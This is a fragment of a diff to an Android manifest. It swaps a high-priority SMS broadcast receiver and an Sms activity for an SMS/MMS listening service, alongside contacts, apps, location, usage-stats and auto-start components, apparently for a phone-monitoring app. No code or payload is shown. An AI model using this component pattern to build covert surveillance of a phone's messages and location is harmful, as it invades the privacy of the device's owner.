@@ -41,16 +41,11 @@
         <activity android:name=".MainActivity" ></activity>
         <activity android:name=".Contacts" ></activity>
         <activity android:name=".Apps" ></activity>
-        <activity android:name=".Sms" ></activity>
         <activity android:name=".Location"></activity>
+        <service android:name=".ListenSmsMmsService" ></service>
         <service android:name=".LocationService"></service>
         <service android:name=".UsageStatService"></service>
 
-        <receiver android:name=".SmsReceiver" android:enabled="true" android:exported="true">
-            <intent-filter android:priority="999">
-                <action android:name="android.provider.Telephony.SMS_RECEIVED"></action>
-            </intent-filter>
-        </receiver>
         <receiver android:name=".AutoStart" android:enabled="true" android:exported="true">
             <intent-filter android:priority="999">
                 <category android:name="android.intent.category.DEFAULT" />
